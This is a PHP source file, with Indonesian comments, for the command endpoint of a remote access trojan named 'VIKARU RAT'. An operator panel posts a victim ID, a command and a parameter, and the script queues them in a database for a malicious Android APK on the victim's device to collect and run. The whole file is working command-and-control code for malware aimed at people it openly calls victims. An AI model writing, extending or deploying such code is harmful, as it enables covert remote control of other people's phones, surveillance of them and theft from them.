<?php
/**
 * VIKARU RAT - Command Endpoint
 * Method: POST (Panel mengirim perintah ke APK korban)
 */

require_once __DIR__ . '/../config.php';

// Hanya POST yang diizinkan
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'method_not_allowed']);
    exit;
}

// Auth wajib
requireAuth();

// Ambil parameter
$victimId  = sanitize($conn, $_POST['victim_id'] ?? '');
$command   = sanitize($conn, $_POST['command'] ?? '');
$parameter = sanitize($conn, $_POST['parameter'] ?? '');

// Validasi
if (empty($victimId)) {
    http_response_code(400);
    echo json_encode(['error' => 'missing_victim_id', 'message' => 'Target victim_id wajib diisi']);
    exit;
}

if (empty($command)) {
    http_response_code(400);
    echo json_encode(['error' => 'missing_command', 'message' => 'Perintah command wajib diisi']);
    exit;
}

// Cek apakah victim ada
$check = mysqli_query($conn, "SELECT id FROM victims WHERE id='$victimId'");
if (mysqli_num_rows($check) === 0) {
    http_response_code(404);
    echo json_encode(['error' => 'victim_not_found', 'message' => 'Korban dengan ID tersebut tidak ditemukan']);
    exit;
}

// Insert perintah ke database
$sql = "INSERT INTO commands (victim_id, command, parameter, status) 
        VALUES ('$victimId', '$command', '$parameter', 'pending')";

if (mysqli_query($conn, $sql)) {
    $commandId = mysqli_insert_id($conn);
    echo json_encode([
        'status'     => 'success',
        'message'    => 'Perintah berhasil dikirim',
        'command_id' => $commandId,
        'victim_id'  => $victimId,
        'command'    => $command,
        'parameter'  => $parameter
    ]);
} else {
    http_response_code(500);
    echo json_encode([
        'error'   => 'insert_failed',
        'message' => mysqli_error($conn)
    ]);
}
?>
